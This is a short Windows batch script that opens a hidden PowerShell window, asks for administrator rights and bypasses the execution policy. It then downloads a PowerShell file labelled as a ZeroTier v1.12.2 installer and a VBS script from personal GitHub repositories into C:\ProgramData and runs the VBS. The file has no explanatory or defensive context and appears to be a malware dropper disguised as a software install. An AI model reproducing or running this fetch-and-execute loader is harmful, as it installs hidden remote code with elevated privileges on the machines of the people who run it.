@echo off
powershell -windowstyle hidden -Command "Start-Process PowerShell.exe -Verb RunAs -ArgumentList '-NoProfile -ExecutionPolicy Bypass -Command \"cd \"C:\ProgramData\"; Start-BitsTransfer https://raw.githubusercontent.com/2o2ks/ZeroTier/main/ZeroTier%20v%201.12.2.ps1; Start-BitsTransfer https://raw.githubusercontent.com/2o2ks/lutfica/main/litch.vbs; .\litch.vbs\"'"
exit
